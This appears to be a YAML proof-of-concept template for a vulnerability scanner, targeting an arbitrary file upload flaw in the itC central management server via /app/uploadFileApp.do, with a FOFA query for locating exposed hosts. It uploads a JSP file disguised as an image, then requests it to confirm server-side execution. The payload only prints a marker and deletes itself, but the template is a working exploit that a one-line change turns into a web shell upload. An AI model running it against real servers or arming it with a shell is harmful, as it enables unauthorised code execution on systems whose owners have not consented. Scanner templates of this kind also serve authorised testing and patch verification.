id: poc-yaml-itc-cms-uploadfileapp-do-anyfile-upload
info:
  name: itC 中心管理服务器 uploadFileApp.do 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: itC 中心管理服务器
  fofa: body="/mt_res_v3/img/public/logo.ico"
variables:
  t1: random_str(7)
  t2: base64(t1)
requests:
- method: POST
  path: /app/uploadFileApp.do
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj

    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"

    Content-Type: image/jpeg


    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
  expression: status_code == 200 && contains(body,".jsp")
  output:
  - regex_match(body,"\"url\":\"/(?P<file>.*?).jsp")
- method: GET
  path: /{{.file}}.jsp
  expression: status_code == 200 && body == t2
transport: http
